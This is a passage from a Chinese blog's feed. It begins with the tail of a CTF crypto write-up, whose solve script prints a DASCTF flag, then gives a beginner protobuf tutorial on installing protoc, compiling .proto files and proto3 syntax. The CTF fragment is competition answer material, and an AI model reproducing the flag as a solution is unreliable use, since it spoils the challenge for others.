R(f._pari_with_name(<span class="string">&#x27;x&#x27;</span>).gcd(g._pari_with_name(<span class="string">&#x27;x&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">m = -<span class="built_in">list</span>(G.monic())[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">17754677231116188359396131937000664637388235962309739341039576063530375612219 79541650983569507936838949546074094434344869740141472134648391439474061318003</span></span><br><span class="line"><span class="string">b&#x27;DASCTF&#123;W5CErsMuFRuDGvRw2sKLrH7kIZjFUIa2LTZO1McZ4g8avbVDl0YBM3EWfuI8msMm&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="strange-rsa">Strange RSA</h2>]]></content>
    
    
    <summary type="html">前言：DAS今年终于有比赛了。做出一题，复现一题，鸽好久了。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>protobuf学习1</title>
    <link href="http://iyheart.github.io/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/"/>
    <id>http://iyheart.github.io/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/</id>
    <published>2025-10-08T06:13:43.000Z</published>
    <updated>2025-10-15T06:21:39.267Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考文章：<a href="https://blog.csdn.net/t5y22/article/details/142169446">ProtoBuf详解_proto buf-CSDN博客</a></li><li>参考文章：<a href="https://protobuf.com.cn/installation/">Protocol Buffer 编译器安装 | Protocol Buffers 文档 - ProtoBuf 文档</a></li><li>参考博客：<a href="https://blog.csdn.net/weixin_74531333/article/details/140469169">【ProtoBuf】在 Windows / Linux 安装 ProtoBuf 编译器（超详细教程）-CSDN博客</a></li></ul><h1 id="基础知识">基础知识</h1><p><code>protobuf</code>英文全称为Protocol Buffers，是Google的一种语言中立、平台中立、可扩展的结构化数据序列化机制。它类似于 JSON，但更小更快，并且能生成原生语言绑定。你只需一次性定义好你想要的数据结构，然后就可以使用专门生成的源代码，轻松地从各种数据流中读写你的结构化数据，并支持多种语言。</p><h2 id="序列化和反序列化">序列化和反序列化</h2><ul><li><p>序列化和反序列化对于学web的可能比较熟悉，但我不是学web的，所以简单介绍一下：</p><ul><li><p>序列化：就是将一个对象转换为字节序的过程;</p></li><li><p>反序列化：就是将一个字节序转换为一个完整对象的过程;</p></li><li><p>使用序列化的情况：</p><ol><li>存储数据：当你想把的内存中的对象状态保存到⼀个⽂件中或者存到数据库中时。</li><li>网络传输：网络直接传输数据，但是无法直接传输对象，所以要在传输前序列化，传输完成后反 序列化成对象。例如我们之前学习过socket编程中发送与接收数据。</li></ol></li><li><p>主流的序列化和反序列化工具有：XML、JSON、ProtoBuf;</p></li></ul></li></ul><h2 id="protobuf版本">protobuf版本</h2><ul><li>目前<code>protobuf</code>的大版本只有<code>protobuf2</code>、<code>protobuf3</code>，这两个大版本。<code>protobuf</code>是开源的，其源代码和发行版都被放置在github仓库中，对应的网址：<a href="https://github.com/protocolbuffers/protobuf">protocolbuffers/protobuf: Protocol Buffers - Google’s data interchange format</a></li><li>通过翻找github上protobuf的发行版，会发现protobuf的版本号有<code>V x.y.z</code>以及下图所示的<code>V x.y</code>这种。<ul><li>其中<code>V x.y.z</code>，<code>x</code>表示主版本号，<code>y</code>表示次版本号，<code>z</code>表示补丁版本号。而通过翻阅后面会发现主版本号只出现<code>2、3</code></li><li>由于主版本号只出现<code>2、3</code>，所以更新到后面主版本号意义确实不太大了，所以就更换了版本号的命名方案，将版本号<code>3</code>给省略了，变成<code>x.y</code>的形式。这种形式默认是<code>protobuf3</code>。（图中<code>V 21.0</code>其实就是这种形式）</li><li>通过观察github仓库的版本，protobuf2的版本范围为：<code>v2.4.1</code>到<code>v2.6.1</code>，而protobuf3的版本范围为：<code>v3.0.0</code>到<code>v3.20.1</code>。而版本命名后的目前截止至<code>2025年10月11日</code>，protobuf的版本已经是从<code>v21.0 </code>到<code>v33.0</code></li></ul></li><li>为了能用上新版本的一些功能以及向下兼容，所以在安装<code>protobuf</code>的时候最好还是安装最新版本，<code>protobuf3</code>是兼容<code>protobuf2</code>的。</li></ul><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251010025324870.png" alt="image-20251010025324870"></p><h2 id="protobuf工作原理">protobuf工作原理</h2><p>使用步骤如下：</p><ol><li>编写.proto⽂件，⽬的是为了定义结构对象（message）及属性内容。</li><li>使⽤ protoc 编译器编译 .proto ⽂件，⽣成⼀系列接口代码，存放在新⽣成头⽂件和源⽂件中。</li><li>依赖⽣成的接口。将编译⽣成的头⽂件包含进我们的代码中，使用编译器为我们生成的序列化，反序列化方法以及一些对消息字段进行读写的方法。</li></ol><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011082338701.png" alt="image-20251011082338701"></p><h2 id="protobuf环境搭建">protobuf环境搭建</h2><p>所谓搭建protobuf环境，其实就是安装<code>protoc</code>编译器，以及Python相关的库，这样基本就可以在C语言中以及Python中使用protobuf结构体。</p><ul><li>下载ProtoBuf前一定要安装依赖库：<code>autoconf automake libtool curl make g++ unzip</code>，否则安装会出现问题。安装命令如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install autoconf automake libtool curl make g++ unzip -y</span><br></pre></td></tr></table></figure><ul><li>然后去到<code>protobuf</code>的<code>github</code>网站上的<code>releases</code>的网站上选择该选项并复制链接，这个博客的安装方法是<code>24年12月份</code>安装的，所以版本还没到<code>v30</code>甚至以上。<a href="https://github.com/protocolbuffers/protobuf/releases">Releases · protocolbuffers/protobuf</a></li></ul><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011083219938.png" alt="image-20251011083219938"></p><ul><li>然后在Linux下使用命令<code>wget</code>下载对应连接的压缩包，并且将压缩包解压出来。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/protocolbuffers/protobuf/releases/download/v29.1/protoc-29.1-linux-x86_64.zip</span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20241214223636850.png" alt="image-20241214223636850"></p><ul><li>先创建一个<code>protoc-29.1-linux-x86_64</code>文件夹用来存放，解压后的protbuf文件。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir protoc-29.1-linux-x86_64</span><br></pre></td></tr></table></figure><ul><li>之后对下载下来的压缩包进行解压，解压到指定文件，使用如下命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip ./protoc-29.1-linux-x86_64.zip -d ./protoc-29.1-linux-x86_64</span><br></pre></td></tr></table></figure><ul><li>然后进入该文件夹，将<code>bin/protoc</code>可执行文件和<code>include/google</code>目录分别放到<code>usr/local/bin</code>和<code>usr/local/include</code>目录下</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp ./protoc /usr/local/bin/</span><br></pre></td></tr></table></figure><ul><li>移动完之后执行<code>protoc --version</code>就会出现如下信息，这就代表着protoc成功安装完成了。</li></ul><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011083522423.png" alt="image-20251011083522423"></p><h2 id="protobuf编译">protobuf编译</h2><ul><li>给出如下的<code>protobuf</code>代码，看看如何编译它，编译它后什么文件会输出出来，先不用理解代码中的内容。创建一个<code>.proto</code>文件。</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> name = <span class="number">2</span>;</span><br><span class="line">    <span class="type">string</span> email = <span class="number">3</span>;</span><br><span class="line">&#125;      </span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011090435753.png" alt="image-20251011090435753"></p><ul><li>接下来使用<code>protoc --python_out=. protobuf1.proto</code>，将该<code>protobuf1</code>文件给编译一下，发现编译后出现了一个<code>.py</code>文件。</li></ul><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011090542395.png" alt="image-20251011090542395"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># NO CHECKED-IN PROTOBUF GENCODE</span></span><br><span class="line"><span class="comment"># source: protobuf1.proto</span></span><br><span class="line"><span class="comment"># Protobuf Python Version: 5.29.1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Generated protocol buffer code.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor_pool <span class="keyword">as</span> _descriptor_pool</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> runtime_version <span class="keyword">as</span> _runtime_version</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="keyword">from</span> google.protobuf.internal <span class="keyword">import</span> builder <span class="keyword">as</span> _builder</span><br><span class="line">_runtime_version.ValidateProtobufRuntimeVersion(</span><br><span class="line">    _runtime_version.Domain.PUBLIC,</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    <span class="number">29</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;protobuf1.proto&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(<span class="string">b&#x27;\n\x0fprotobuf1.proto\&quot;/\n\x04Test\x12\n\n\x02id\x18\x01 \x01(\x05\x12\x0c\n\x04name\x18\x02 \x01(\t\x12\r\n\x05\x65mail\x18\x03 \x01(\tb\x06proto3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_<span class="built_in">globals</span> = <span class="built_in">globals</span>()</span><br><span class="line">_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _<span class="built_in">globals</span>)</span><br><span class="line">_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, <span class="string">&#x27;protobuf1_pb2&#x27;</span>, _<span class="built_in">globals</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> _descriptor._USE_C_DESCRIPTORS:</span><br><span class="line">  DESCRIPTOR._loaded_options = <span class="literal">None</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_TEST&#x27;</span>]._serialized_start=<span class="number">19</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_TEST&#x27;</span>]._serialized_end=<span class="number">66</span></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>还可以编译成<code>.C</code>文件，以及<code>.CPP</code>文件，使用<code>protoc --c_out=. protobuf1.proto</code>将生成<code>.c</code>文件和<code>.h</code>文件。然后使用<code>protoc --cpp_out=. protobuf1.proto</code>就可以生成<code>.cc</code>文件和<code>.h</code>文件。</li></ul><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011091044219.png" alt="image-20251011091044219"></p><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011091336142.png" alt="image-20251011091336142"></p><table><thead><tr><th>编译指令</th><th>结果</th></tr></thead><tbody><tr><td><code>protoc --c_out=. protobuf1.proto</code></td><td>生成<code>.c</code>文件以及<code>.h</code>文件</td></tr><tr><td><code>protoc --python_out=. protobuf1.proto</code></td><td>生成<code>.py</code>文件</td></tr><tr><td><code>protoc --cpp_out=. protobuf1.proto</code></td><td>生成<code>.cc</code>文件以及<code>.h</code>文件</td></tr></tbody></table><h2 id="protobuf使用">protobuf使用</h2><ul><li>现在已经将<code>protobuf</code>进行编译，编译成了其他语言的文件，那如何在编写其他语言的情况下使用这个<code>protobuf</code>文件。接下来的例子就是做一个实例了解一下如何使用。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意如果第一次编写的时候应该需要下载protobuf1_pb2.py文件所包含的库文件</span></span><br><span class="line"><span class="keyword">import</span> protobuf1_pb2</span><br><span class="line">msg = protobuf1_pb2.Test()</span><br><span class="line">msg.<span class="built_in">id</span> = <span class="number">123</span></span><br><span class="line">msg.name = <span class="string">&quot;张三&quot;</span></span><br><span class="line">msg.email = <span class="string">&quot;111@qq.com&quot;</span></span><br><span class="line"><span class="built_in">print</span>(msg) <span class="comment"># 结构化输出msg</span></span><br><span class="line"><span class="built_in">print</span>(msg.SerializeToString()) <span class="comment"># 序列化转成二进制字节形式</span></span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/protobuf/protobuf%E5%AD%A6%E4%B9%A01/image-20251011093240496.png" alt="image-20251011093240496"></p><h1 id="数据类型">数据类型</h1><h2 id="标量类型">标量类型</h2><p><code>Protobuf</code>支持多种标量类型，具体如下表：</p><table><thead><tr><th>数据类型</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>int32</code>、<code>int64</code></td><td>32位或64位有符号整数</td><td><code>int age=1;</code></td></tr><tr><td><code>uint32</code>、<code>uint64</code></td><td>32位或64位无符号整数</td><td><code>uint32 id=2;</code></td></tr><tr><td><code>float</code></td><td>单精度浮点数</td><td><code>float score = 3;</code></td></tr><tr><td><code>double</code></td><td>双精度浮点数</td><td><code>double ratio = 4;</code></td></tr><tr><td><code>bool</code></td><td>布尔值</td><td><code>bool is_active = 5;</code></td></tr><tr><td><code>string</code></td><td>字符串</td><td><code>string name=6; </code></td></tr><tr><td><code>bytes</code></td><td>二进制数据</td><td><code>bytes data=7;</code></td></tr></tbody></table><h2 id="复合类型">复合类型</h2><ul><li>枚举类型：用于定义一组命名常量。使用关键字<code>enum</code>进行定义。</li><li>消息类型：类似于结构体，用于定义复杂的数据结构。使用<code>message</code>关键字进行定义。</li></ul><p>例子1：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面创建一个包含枚举类型的消息</span></span><br><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> my_package;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Person</span>&#123;</span><br><span class="line"><span class="comment">// 声明一个枚举类型,注意等号</span></span><br><span class="line"><span class="keyword">enum </span><span class="title class_">Gender</span> &#123; </span><br><span class="line">GENDER_UNKNOWN = <span class="number">0</span>;</span><br><span class="line">        MALE = <span class="number">1</span>;</span><br><span class="line">        FEMALE = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 消息类型开始定义</span></span><br><span class="line"><span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 定义一个Gender变量</span></span><br><span class="line">Gender gender = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例子2：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//枚举类型也能定义在消息类型的外面,可以作为多个消息类型中的一个枚举类型</span></span><br><span class="line"><span class="comment">// 系统角色的定义</span></span><br><span class="line"><span class="keyword">enum </span><span class="title class_">UserRole</span>&#123;</span><br><span class="line">USER_ROLE_UNKNOWN = <span class="number">0</span>; <span class="comment">// 默认值,未知角色</span></span><br><span class="line">USER_ROLE_ADMIN = <span class="number">1</span>;   <span class="comment">// 管理员</span></span><br><span class="line">USER_ROLE_EDITOR = <span class="number">2</span>;  <span class="comment">// 编辑者</span></span><br><span class="line">USER_ROLE_VIEWER = <span class="number">3</span>;  <span class="comment">// 仅查看者</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义消息结构</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">User</span>&#123;</span><br><span class="line"><span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line">UserRole role = <span class="number">2</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="基本语法">基本语法</h1><ul><li>参考博客：<a href="https://www.cnblogs.com/niumachen/p/18630131">Protobuf 文件语法 - 牛马chen - 博客园</a></li></ul><h2 id="语法版本">语法版本</h2><p>使用<code>syntax</code>指定<code>protobuf</code>的版本（<code>proto2</code>或<code>proto3</code>），目前推荐使用<code>proto3</code>。例子如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>; <span class="comment">// 使用protobuf3的版本</span></span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>; <span class="comment">// 使用protobuf2的版本</span></span><br></pre></td></tr></table></figure><h2 id="包声明">包声明</h2><p>使用<code>package</code>定义命名空间，避免不同模块间的命名冲突。例子如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> my_package;</span><br></pre></td></tr></table></figure><h2 id="导入其他文件">导入其他文件</h2><p>使用<code>import</code> 导入其他的<code>.proto</code>文件中的定义。例子如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;common.proto&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="注释">注释</h2><p>对于<code>protobuf</code>的注释和<code>C</code>语言是一样的，都是通过<code>//</code> 进行单行注释。以及通过<code>/**/</code>进行多行注释。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是protobuf的单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是protobuf的多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="定义与声明数据">定义与声明数据</h2><p>对于<code>proto3</code>，可以使用<code>数据类型 变量名 = 字段编号</code>来定义和声明数据类型。例子如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> my_package;</span><br><span class="line"><span class="comment">//  数据类型 变量名 = 字段编号;</span></span><br><span class="line"><span class="comment">//  定义一个age变量,字段编号;</span></span><br><span class="line"><span class="comment">//  字段编号必须是1~2^31-1</span></span><br><span class="line"><span class="comment">// 19000 ~ 19999(系统保留)</span></span><br><span class="line"><span class="type">uint32</span> age = <span class="number">1</span>; </span><br></pre></td></tr></table></figure><p>注意：字段编号是字段编号，而不是这些变量的默认值，在<code>protbuf</code>中会自动给变量赋予一个默认值。各种类型的默认值如下：</p><table><thead><tr><th>字段类型</th><th>默认值</th></tr></thead><tbody><tr><td>数值类型<code>int32 uint32</code>等</td><td><code>0</code></td></tr><tr><td>字符串</td><td><code>&quot;&quot;</code>（空字符串）</td></tr><tr><td>bool</td><td><code>false</code></td></tr><tr><td>枚举</td><td>枚举中值为<code>0</code>的项</td></tr><tr><td>message</td><td><code>nil/None</code>（未设置）</td></tr></tbody></table><p>对于<code>proto2</code>来说，可以使用<code>标记词 变量名 = 字段编号;</code>来定义和声明数据类型。例子如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> tutorial;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面需要使用标记词来,定义消息里面的变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Person</span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="type">string</span> name = <span class="number">1</span>; <span class="comment">// 必须字段</span></span><br><span class="line"><span class="keyword">optional</span> <span class="type">int32</span> id = <span class="number">2</span>;  <span class="comment">// 可选字段</span></span><br><span class="line"><span class="keyword">optional</span> <span class="type">string</span> email = <span class="number">3</span>; <span class="comment">// 可选字段</span></span><br><span class="line"><span class="keyword">repeated</span> <span class="type">string</span> phone_number = <span class="number">4</span>; <span class="comment">//重复字段(数组)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="标记词">标记词</h2><ul><li>标记词在<code>proto2</code>中定义变量是必须要修饰的，而<code>proto3</code>在定义变量的时候默认使用<code>optional</code>修饰，不必要求用户显式的定义声明。接下来介绍一下这些标记词。</li></ul><table><thead><tr><th>标记词</th><th>含义</th><th>说明</th></tr></thead><tbody><tr><td><code>required</code>（proto3已经被移除）</td><td>必须字段</td><td>必须赋值，如果不赋值序列化会失败，反序列化可能也会出错</td></tr><tr><td><code>optional</code></td><td>可选字段</td><td>可以设置；不设置时会使用默认值</td></tr><tr><td><code>repeated</code></td><td>可重复字段</td><td>类似数组或列表，可出现多次</td></tr></tbody></table><ul><li>对于<code>repeated </code>字段，表示重复字段，可以出现多次，等价于数组或者列表</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">message </span><span class="title class_">Student</span> &#123;</span><br><span class="line"><span class="keyword">repeated</span> <span class="type">string</span> courses = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 序列化后的course字段可能是</span></span><br><span class="line">courser = [<span class="string">&quot;Math&quot;</span>,<span class="string">&quot;Englist&quot;</span>,<span class="string">&quot;Physics&quot;</span>]</span><br></pre></td></tr></table></figure><h1 id="proto3语法详解">proto3语法详解</h1><h2 id="消息基本结构">消息——基本结构</h2><ul><li>消息，也就是类似于C语言结构体的东西，是<code>protobuf</code>的核心，用于定义数据结构。</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>; </span><br><span class="line"><span class="keyword">package</span> my_package;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="type">int32</span> id = <span class="number">1</span>;   <span class="comment">// 用户ID</span></span><br><span class="line">    <span class="type">string</span> name = <span class="number">2</span>;<span class="comment">// 用户名</span></span><br><span class="line">    <span class="type">bool</span> is_active = <span class="number">3</span>; <span class="comment">// 是否活跃</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="嵌套消息">嵌套消息</h2><ul><li>一个消息结构中可以嵌套另一个消息结构。</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> my_package;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Address</span>&#123;</span><br><span class="line">    <span class="type">string</span> street = <span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> city = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> name = <span class="number">2</span>;</span><br><span class="line">    Address address = <span class="number">3</span>; <span class="comment">// 嵌套消息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="枚举类型">枚举类型</h2><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> my_package;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum </span><span class="title class_">UserType</span> &#123;</span><br><span class="line">    UNKNOWN = <span class="number">0</span>;</span><br><span class="line">    ADMIN = <span class="number">1</span>;</span><br><span class="line">    USER = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> name = <span class="number">2</span>;</span><br><span class="line">    UserType type =<span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务定义">服务定义</h2><ul><li>用于定义<code>RPC</code>服务的接口。</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">service </span><span class="title class_">UserSerice</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> GetUser (UserRequest) return (UserResponse)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> ListUsers (Empty) <span class="keyword">returns</span> (stream User)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：赶着ddl大概是写完了，先定个截止日期，10月15日之前</summary>
    
    
    
